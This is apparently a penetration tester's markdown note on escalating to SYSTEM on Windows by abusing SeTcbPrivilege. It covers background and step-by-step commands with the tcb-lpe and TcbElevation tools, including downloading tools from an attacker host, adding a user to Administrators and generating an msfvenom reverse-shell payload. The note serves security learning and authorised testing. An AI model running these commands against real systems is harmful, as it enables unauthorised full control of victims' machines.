---
created: 2026-09-19
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
> [!abstract]+ **Scope**: `SeTcbPrivilege` (`Act as part of the operating system`); executing commands as `SYSTEM` through the SCM.

- [ ] Confirm your current user has `SeTcbPrivilege` assigned (either directly or inherited from a group membership) and determine whether it's enabled.
- [ ] If the privilege is present but disabled, enable it in the process that will perform the privileged operation (e.g., using [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1) in PowerShell).
- [ ] Escalate privileges to `SYSTEM` through a transient service (`tcb-lpe` / `TcbElevation`).
- [ ] Verify privilege escalation.

## `SeTcbPrivilege`

>**`SeTcbPrivilege`** is a Windows user right (`Act as part of the operating system`, constant `SE_TCB_NAME`) that identifies its holder as part of the Trusted Computing Base (TCB).

- A process holding an enabled `SeTcbPrivilege` is trusted by the Local Security Authority (LSA) *as an operating-system component*. It can assume the identity of any user and request arbitrary additional groups and privileges in the resulting access token. So, `SeTcpPrivilege` is one of the most powerful privileges on Windows. 
- `SeTcbPrivilege` is required to perform certain sensitive LSA operations. For example, it is required to register a logon process with `LsaRegisterLogonProcess()`, or for certain privileged uses of `LsaLogonUser()`, such as requesting an impersonation token or specifying local groups.
- Unlike `SeImpersonatePrivilege`, which only lets you impersonate tokens you can already obtain, `SeTcbPrivilege` lets you **create** tokens for arbitrary identities — including `NT AUTHORITY\SYSTEM` (SID `S-1-5-18`) — without knowing credentials.

>[!important] By default, `SeTcbPrivilege` is not assigned to any user account (`Not defined`). In practice only `NT AUTHORITY\SYSTEM` (`LocalSystem`) holds it. Microsoft recommends never assigning it to a user account and instead running services that require it as `LocalSystem`.

>[!note] See [`Act as part of the operating system — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system).

> [!note] See [[Windows privileges]] and [[Access tokens and impersonation]].

- `SeTcbPrivilege` privilege escalation vectors:
	- **Executing commands as `SYSTEM` via the SCM (Service Control Manager)**
		- Modifying the local [SSPI](https://learn.microsoft.com/en-us/windows/win32/rpc/security-support-provider-interface-sspi-) function table so that `AcquireCredentialsHandleW()` uses the `SYSTEM` logon ID (`0x3E7`), then creating a temporary service with `binPath` set to your custom executable, and starting the service through the SCM.
		- The SCM starts the service as `SYSTEM`, therefore your command also runs as `SYSTEM`.
	- **Fabricating privileged tokens via `S4U` logon**
		- Registering the process as a trusted LSA logon process with `LsaRegisterLogonProcess()`, then calling `LsaLogonUser()` with `KERB_S4U_LOGON` for your own account with the `SYSTEM` SID (`S-1-5-18`) in the `LocalGroups` parameter. As a result, Windows creates a token containing the specified group; you can then impersonate this token from your own thread.

## Enumerating and enabling privileges

- Check if `SeTcbPrivilege` is present in your access token:

```powershell
whoami /priv
```

- Even if the privilege is present in the output but marked `Disabled`, Windows won't consider it during access checks. You need to enable the privilege first before using it.
- In your current PowerShell session, you can use [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1):

```powershell
Import-Module .\EnableAllTokenPrivs.ps1
```
```powershell
.\EnableAllTokenPrivs.ps1
```
```powershell
whoami /priv
```

>[!note] The script calls `AdjustTokenPrivileges()` against your current process token; it can't assign new privileges, only toggle already assigned privileges to an enabled state.

>[!tip]+
>If `whoami /priv` does not list `SeTcbPrivilege` at all, the current logon session was not granted it. Try to log off and back on, then re-check. User-rights changes take effect at next logon.
## Executing commands as `SYSTEM` via the SCM

- One of the most reliable ways to escalate to `SYSTEM` using `SeTcbPrivilege` works as follows:
	1. Enable `SeTcbPrivilege` in the current process.
	2. Replace `AcquireCredentialsHandleW` in the process SSPI function table with a hook that forces `pvLogonId` to `0x3E7` (the `SYSTEM` logon-session LUID).
	3. Call `OpenSCManagerW()` + `CreateServiceW()` with an attacker-controlled `binPath`, then `StartServiceW()`. When the SCM queries credentials, the hook returns the `SYSTEM` logon session, so the service process starts as `SYSTEM`.
	4. Delete the transient service.
### Executing commands with `tcb-lpe`

- [`tcb-lpe`](https://github.com/CharminDoge/tcb-lpe) is a Go port of the original `TcbElevation.cpp` PoC. It creates and starts a service named `AAATcb` that executes the provided command, then deletes the service automatically.
---
1. Transfer `tcb.exe` to the target:

```bash
python3 -m http.server 8000
```

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/tcb.exe" -OutFile "C:\Windows\Temp\tcb.exe"
```

2. Confirm `SeTcbPrivilege` is enabled (see [[#Enumerating and enabling privileges]]):

```powershell
whoami /priv
```

3. Execute a command as `SYSTEM`. The single argument is the full command line the transient `AAATcb` service will run:

```powershell
C:\Windows\Temp\tcb.exe "C:\Windows\System32\cmd.exe /c net localgroup administrators <username> /add"
```

---

- Or, run your custom executable:

```powershell
C:\Windows\Temp\tcb.exe "C:\Windows\Temp\shell.exe"
```


>[!tip]+
>- Generate a staged payload using `msfvenom` before transferring it:
> ```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=4444 -f exe -o shell.exe
> ```

4. Verify privilege escalation:

```powershell
whoami
```

```powershell
net localgroup administrators
```

5. If the service was not removed automatically (for example, the process was interrupted), clean it up manually:

```powershell
C:\Windows\Temp\tcb.exe clean
```

```powershell
sc.exe delete AAATcb
```

### Executing commands with `TcbElevation`

- The original [`TcbElevation.cpp`](https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178) proof of concept (compiled binaries in [`SeTcbPrivilege-Abuse`](https://github.com/b4lisong/SeTcbPrivilege-Abuse)) takes two arguments: a non-existent service name and the command line to run. The mechanism is identical to `tcb-lpe`, except you choose the service name and must delete it yourself.

1. Transfer the matching-architecture binary to the target host:

```bash
python3 -m http.server 8000
```

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/TcbElevation-x64.exe" -OutFile "C:\Windows\Temp\TcbElevation.exe"
```

2. Execute a command as `SYSTEM`. The service name must not already exist:

```powershell
C:\Windows\Temp\TcbElevation.exe TESTSVC "C:\Windows\System32\cmd.exe /c net localgroup administrators <username> /add"
```

>[!note]+ `TESTSVC` here is the name of the transient service to create; it must not collide with any existing services on the system.

- Run a custom executable instead:

```powershell
C:\Windows\Temp\TcbElevation.exe TESTSVC "C:\Windows\Temp\shell.exe"
```

3. Verify privilege escalation:

```powershell
whoami
```

```powershell
net localgroup administrators
```

4. Remove the transient service when done:

```powershell
sc.exe delete TESTSVC
```

>[!warning] The SCM executes `binPath` as `SYSTEM` immediately on `StartServiceW()`. A mistyped `binPath` still creates the service entry — always verify the command path exists and delete the service afterwards.

## References and further reading

- [`Windows Privilege Escalation: SeTcbPrivilege — Hacking Articles`](https://www.hackingarticles.in/windows-privilege-escalation-setcbprivilege/)

- [`Act as part of the operating system — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)
- [`Privilege Constants (Authorization) — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [`LsaLogonUser function — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalogonuser)
- [`LsaRegisterLogonProcess function — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaregisterlogonprocess)
- [`Abusing Token Privileges For LPE — Exploit-DB`](https://www.exploit-db.com/papers/42556)
- [`TcbElevation.cpp — Antonio Coco (gist)`](https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178)
- [`tcb-lpe — GitHub`](https://github.com/CharminDoge/tcb-lpe)

- [`AcquireCredentialsHandleW function — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-acquirecredentialshandlew)
